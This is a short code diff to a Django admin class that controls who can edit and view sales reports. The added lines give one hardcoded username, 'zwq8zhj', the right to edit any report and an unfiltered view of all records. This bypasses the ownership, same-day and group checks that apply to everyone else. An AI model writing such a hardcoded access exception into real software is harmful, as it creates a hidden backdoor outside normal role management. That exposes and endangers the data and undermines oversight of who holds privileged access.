@@ -151,7 +151,7 @@ class JcReportAdmin(admin.ModelAdmin):
         if request.user.groups.values():
             if request.user.groups.values()[0]['name'] =='boss' or request.user.groups.values()[0]['name'] == 'JCboss':
                 return False
-        if obj is not None and obj.date1 == timezone.now().date() and  obj.salesman==request.user or request.user.is_superuser:
+        if obj is not None and obj.date1 == timezone.now().date() and  obj.salesman==request.user or request.user.is_superuser or request.user.username == 'zwq8zhj':
  
              return True
         
@@ -160,7 +160,8 @@ class JcReportAdmin(admin.ModelAdmin):
         qs = super(JcReportAdmin, self).get_queryset(request)
         if request.user.is_superuser:
             return qs
-        
+        if request.user.username == 'zwq8zhj':
+            return qs
         user_in_group_list = request.user.groups.values('name')
         # print(user_in_group_list)
         for user_in_group_dict in user_in_group_list:
